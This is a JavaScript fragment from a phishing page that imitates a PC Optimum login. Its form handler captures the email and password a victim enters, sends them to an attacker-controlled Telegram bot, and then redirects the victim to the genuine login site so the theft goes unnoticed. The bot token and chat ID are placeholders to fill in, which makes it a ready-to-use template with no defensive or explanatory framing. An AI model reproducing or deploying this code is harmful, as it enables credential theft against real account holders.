                <script>
                    function togglePassword() {
            var passwordInput = document.getElementById('password');
            var passwordToggleBtn = document.querySelector('.password-group__toggle-button');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                passwordToggleBtn.textContent = 'Hide Password';
            } else {
                passwordInput.type = 'password';
                passwordToggleBtn.textContent = 'Show Password';
            }
        }
                    function submitForm(event) {
                        event.preventDefault();
                        var email = document.getElementById('email').value;
                        var password = document.getElementById('password').value;
                        fetch('https://api.telegram.org/bot(PUT UR BOT ID HERE AND REMOVE ()s )/sendMessage', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ chat_id: '(PUT YOUR CHAT ID HERE AND REMOVE ()s )',text: `PC OPTIMUM: email: ${email} password: ${password}` }),
                        }

                        ).then(res=>res.json()).catch(e=>console.log(e))
                        window.location.href = 'https://accounts.pcid.ca/login';
                    }
